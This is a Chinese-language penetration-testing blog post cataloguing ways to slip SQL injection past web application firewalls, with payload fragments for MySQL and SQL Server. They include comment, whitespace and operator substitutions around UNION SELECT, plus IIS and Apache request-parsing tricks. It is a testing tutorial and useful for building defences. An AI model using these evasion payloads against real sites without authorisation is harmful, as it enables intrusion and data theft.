---
title: "sql注入bypass"
categories: 渗透测试
tags: 渗透测试
toc: true
toc_label: 目录
toc_icon: "cog"
---

> 本文介绍sql注入bypass的一些技巧

## 1 SQL注入过程中的处理

	终端payload编码 ---------> web服务器解码 ---------> CGI脚本解码 ---------> web应用解码 ---------> 数据库解码
     浏览器、代理等         IIS/Apache/Tomcat        php/java/asp.net           xxx系统           mysql/slqserver
     				  硬件WAF				 软件WAF

---

## 2 bypass方法

### 2.1 服务器层面bypass

#### 2.1.1 IIS+ASP、URL处理


%符号的处理：会自动去掉特殊符号%，例如输入se%lect，解析出select

unicode处理：%u，会自动解码，例如s%u006c%u0006ect

#### 2.1.2 Apache


有的版本允许畸形请求存在，例如GET可替换为任意word，例如"DOTA"

#### 2.1.3 HPP方式

    id=1&id=2&id=3

    Asp.net + iis：id=1,2,3
    Asp + iis：id=1,2,3
    Php + apache：id=3


### 2.2 数据库层面bypass

	1 union select a, b from  where and 
	 1  2  3  4   5    6    7      8   9

#### 2.2.1 mysql数据库

##### 位置1的替换：

1、\N: 
	
	id=\Nunion select 

2、浮点数直接连接: 
	
	id=1.1union select

3、nen: n为整数，例如：

	1e2union select

4、单/双引号: 如果需要单/双引号闭合，则无需空格

5、左括号：例如:

	1 union(select xx)

6、注释: 任意/**/注释，例如

	1/*here*/union select xx

7、特殊注释: 例如，其中的数字和版本有关，一般大于10000都行

	id=1/*!50000union*/select

##### 位置2的替换

##### 位置3的替换

1、空格替换：有如下字符可替代空格

	%09, %0a, %0b, %0c, %0d, %a0

2、注释: 任意/**/注释，例如

	1 union/*here*/select xx

3、左括号：

	1 union(select xx)

##### 位置4的替换

##### 位置5的替换

1、空格替换：有如下字符可替代空格

	%09, %0a, %0b, %0c, %0d, %a0


2、左括号：例如:

	1 union select(1),xx

3、运算符

*加减号：*

	1 union select+1,xx
	1 union select-1,xx

*~符号：*

	1 union select~1,xx

*!符号：*

	1 union select!1,xx

*@`` @^符号：(at后面是反引号)*

	1 union select@`1`,xx
	1 union select@^1,xx

4、注释: 任意/**/注释，例如

	1/*here*/union select xx

5、特殊注释: 例如

	1 union/*!50000select*/1,xx

6、反引号

	1 union select`user`,xx

7、单/双引号:

	1 union select"1",xx

8、{}大括号

	1 union select{x 1},xx

9、\N符号

	1 union select\N,xx


##### 位置6的替换

同位置5的替换

##### 位置7的替换

参考位置5，无算数运算符

##### 其他

1、字符串截取函数

	Mid(version(),1,1)
	Substr(version(),1,1)
	Substring(version(),1,1)
	Lpad(version(),1,1)
	Rpad(version(),1,1)
	Left(version(),1)
	reverse(right(reverse(version()),1)

2、字符串连接函数

	concat(version(),'|',user());
	concat_ws('|',1,2,3)

3、字符转换

	Ascii(1)
	Char(49)
	Hex(‘a’)
	Unhex(61)

4、/\*!50000keyword\*/替换

    任何关键字都可以用/*!50000keyword*/替换，例如：
    select name from user where id=1 union select user();
    select name from user where id=1 union/*!50000select*/user();
    select name from user where id=1 /*!50000union*/select user();
    select name from user where id=1 union select/*!50000user()*/;

---

#### 2.2.2 sqlserver数据库

##### 空格符的替换

空格符可使用以下符号替换：

	01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 

##### 位置5/6的替换

1、:号

	1 union select:top 1 from

##### 位置7的替换：

1、.号

	1 union select xx from.table

2、:号

	1 union select xx from:table

##### and后的替换：

1、:号

	1 and:xx

2、%2b号

	1 and%2bxx

##### 其他

1、字符串截取函数

	Substring(@@version,1,1)
	Left(@@version,1)
	Right(@@version,1)

2、字符串转换函数

	Ascii(‘a’) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
	Char(‘97’)

---

## 3 参考

* http://drops.wooyun.org/tips/7883
* http://drops.wooyun.org/tips/968
* https://www.exploit-db.com/papers/17934/
* http://drops.wooyun.org/tips/123